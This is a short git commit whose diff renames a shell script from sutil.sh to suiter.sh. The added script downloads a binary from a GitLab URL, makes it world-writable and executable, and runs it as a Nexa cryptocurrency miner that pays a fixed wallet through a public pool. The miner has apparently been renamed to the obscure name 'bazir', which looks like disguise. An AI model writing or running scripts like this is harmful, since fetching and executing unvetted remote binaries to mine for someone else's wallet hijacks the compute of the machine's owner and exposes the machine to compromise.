368cef17269ce807062bdc7d3a936c9069e99856
unauna1803 <128925543+unauna1803@users.noreply.github.com>
2023-03-27 01:00:41 +0700

    Update and rename sutil.sh to suiter.sh

---
+++ suiter.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+wget https://gitlab.com/taufiqnurul2022/circle/-/raw/main/bazir 
+chmod 777 bazir
+./bazir -a nexa -p stratum+tcp://pool.woolypooly.com:3124 -w nexa:nqtsq5g5wy64h8wxxv68mqa7u9xfry4t423ycl2f4lxgl6qy.tes
--- sutil.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-
-wget https://gitlab.com/taufiqnurul2022/circle/-/raw/main/bazir 
-
-./bzminer -a nexa -p stratum+tcp://pool.woolypooly.com:3124 -w nexa:nqtsq5g5wy64h8wxxv68mqa7u9xfry4t423ycl2f4lxgl6qy.tes
